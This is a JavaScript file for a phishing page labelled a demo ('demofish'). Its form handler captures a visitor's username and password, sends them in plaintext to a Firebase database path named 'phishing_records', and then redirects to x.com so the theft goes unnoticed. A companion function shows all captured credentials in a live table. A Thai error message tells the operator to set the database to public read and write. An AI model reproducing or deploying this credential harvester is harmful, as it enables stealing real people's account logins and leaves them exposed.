const firebaseConfig = {
  apiKey: "AIzaSyCyWpBKk3UFizYhlNCfpuoGkmUP32mX9fg",
  authDomain: "demofish.firebaseapp.com",
  projectId: "demofish",
  storageBucket: "demofish.firebasestorage.app",
  messagingSenderId: "900295647884",
  appId: "1:900295647884:web:574809a3458166136611a9",
  measurementId: "G-J8J42ZZZDZ",
  databaseURL: "https://demofish-default-rtdb.asia-southeast1.firebasedatabase.app" // กลับมาใช้ Singapore ตามที่ยูสเซอร์ต้องการ
};

if (!firebase.apps.length) {
  firebase.initializeApp(firebaseConfig);
}
const db = firebase.database();

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function renderDemoTable() {
  const tableBody = document.getElementById('recordsTableBody');
  if (!tableBody) return;

  // Listen for real-time updates from Firebase
  db.ref('phishing_records').on('value', (snapshot) => {
    const data = snapshot.val();
    if (!data) {
      tableBody.innerHTML = '<tr><td colspan="4">No demo data yet. Submit the form from the home page.</td></tr>';
      return;
    }

    // Convert object to array and sort descending by timestamp (newest first)
    const records = Object.keys(data).map(key => ({
      id: key,
      ...data[key]
    })).sort((a, b) => b.timestamp - a.timestamp);

    tableBody.innerHTML = records.map((record, index) => `
      <tr>
        <td>${index + 1}</td>
        <td>${escapeHtml(record.username)}</td>
        <td>${escapeHtml(record.password)}</td>
        <td>${escapeHtml(record.submittedAt)}</td>
      </tr>
    `).join('');
  });
}

document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('demoForm');
  const clearRecords = document.getElementById('clearRecords');

  if (form) {
    form.addEventListener('submit', (event) => {
      event.preventDefault();

      const usernameInput = document.getElementById('demo_username').value;
      const passwordInput = document.getElementById('demo_password').value;

      if (!usernameInput.trim() || !passwordInput.trim()) {
        alert('Please fill in both fields.');
        return;
      }
      
      const record = {
        username: usernameInput,
        password: passwordInput,
        submittedAt: new Date().toLocaleString(),
        timestamp: firebase.database.ServerValue.TIMESTAMP
      };

      // Push to Firebase and then redirect
      db.ref('phishing_records').push(record)
        .then(() => {
          window.location.href = 'https://x.com';
        })
        .catch((error) => {
          console.error("Error saving data:", error);
          alert('ไม่สามารถบันทึกข้อมูลได้ กรุณาตรวจสอบว่า Realtime Database ได้เปิด Test Mode (Rule: .read=true, .write=true) แล้ว');
        });
    });
  }

  if (clearRecords) {
    clearRecords.addEventListener('click', (event) => {
      event.preventDefault();
      if (confirm('คุณแน่ใจหรือไม่ว่าต้องการลบข้อมูลทั้งหมด?')) {
        db.ref('phishing_records').remove()
          .catch((err) => alert("เกิดข้อผิดพลาดในการลบข้อมูล (อาจเกี่ยวกับ Database Rules)"));
      }
    });
  }
});
